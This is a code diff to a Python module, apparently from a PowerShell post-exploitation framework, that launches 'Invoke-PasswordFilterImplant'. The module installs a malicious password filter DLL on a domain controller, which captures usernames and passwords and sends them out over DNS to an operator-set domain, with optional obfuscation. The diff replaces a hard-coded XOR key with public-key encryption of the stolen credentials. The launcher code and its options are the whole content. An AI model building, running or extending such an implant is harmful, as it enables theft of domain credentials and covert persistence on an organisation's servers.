@@ -1,70 +1,51 @@
 from lib.common import helpers
 import base64
-
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.serialization import load_pem_public_key
 
 class Module:
 
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-		
             'Name': 'Invoke-PasswordFilterImplant',
-
-
-            'Author': ['@Le-non', '@DorethZ10'],
-
-
+            'Author': ['@Le-non', '@DorethZ10', '@alxbl'],
             'Description': ('Installs a malicious password filter (x64 ONLY) on the DC that performs username and password exfiltration via DNS. The data is exfiltrated in the format requestnumber.data.domain.com. The data is the hex result of "username:password" XORed with the key. Note: this module will only work on x64 systems.'),
-
-
             'Background': False,
-
-
             'OutputExtension': None,
-
-
             'NeedsAdmin': True,
-
-
             'OpsecSafe': False,
-
-
             'Language': 'powershell',
-
-
             'MinLanguageVersion': '2',
-
         }
 
-
         self.options = {
-
-		'Agent': {
+        'Agent': {
                 'Description':   'Agent to run the module on.',
                 'Required'   :   True,
                 'Value'      :   ''
             },
- 		'KeyValue': {
-                'Description'   :   'Encrypting key for the passwords',
+         'Key': {
+                'Description'   :   'Path to the public key to use for data encryption.',
                 'Required'      :   True,
-                'Value'         :   '31337'
+                'Value'         :   ''
             },
         'DomainValue' : {
-                'Description'   :   'DNS Domain to exfill the data. MUST start with a \'.\'',
+                'Description'   :   'DNS Domain to exfiltrate the data. MUST start with a \'.\'',
                 'Required'      :   True,
                 'Value'         :   '.example.com'
             },
-		'DllName' : {
+        'DllName' : {
                 'Description'   :   'File name of the password filter. (Excluding the ".dll" file extension)',
                 'Required'      :   True,
                 'Value'         :   'DLLPasswordFilterImplant'
-            },	
-		'DllPath' : {
+            },
+        'DllPath' : {
                 'Description'   :   'Path to the System32 folder of the target',
                 'Required'      :   True,
                 'Value'         :   'C:\Windows\System32'
-            },	
-		'Cleanup' : {
+            },
+        'Cleanup' : {
                 'Description'   :   'Cleanup the trigger and any script from specified location. Note: the DLL will stay on the disk. The registry keys will be cleared so it won\'t load  anymore.',
                 'Required'      :   False,
                 'Value'         :   ''
@@ -92,24 +73,42 @@ class Module:
             print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
             return ""
 
+        # Verify that the public key is valid
+        key = self.options['Key']['Value']
+        if key == '':
+            print helpers.color("[!] Specify the path to the public key file. (e.g. pub.pem)")
+            return ""
+        with open(key, 'rb') as keyfile:
+            pubkey = keyfile.read()
+            try:
+                load_pem_public_key(pubkey, default_backend())
+            except:
+                print helpers.color("[!] Failed to parse public key file at: " + str(key))
+                return ""
+            pubkey = ''.join(pubkey.split('\n')[1:-1])
+
         moduleCode = f.read()
         f.close()
 
-		script = moduleCode
+        script = moduleCode
 
         # Need to actually run the module that has been loaded
         scriptEnd = 'Invoke-PasswordFilterImplant'
 
         # Add any arguments to the end execution of the script
         for option, values in self.options.iteritems():
-            if option.lower() != "agent":
+            if option.lower() not in ["agent", "key"]:
                 if values['Value'] and values['Value'] != '':
                     if values['Value'].lower() == "true":
                         # if we're just adding a switch
                         scriptEnd += " -" + str(option)
                     else:
                         scriptEnd += " -" + str(option) + " \"" + str(values['Value']) + "\""
+
+        scriptEnd += ' -Key "{}"'.format(pubkey)
+
         if obfuscate:
             scriptEnd = helpers.obfuscate(psScript=scriptEnd, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
         return script
+
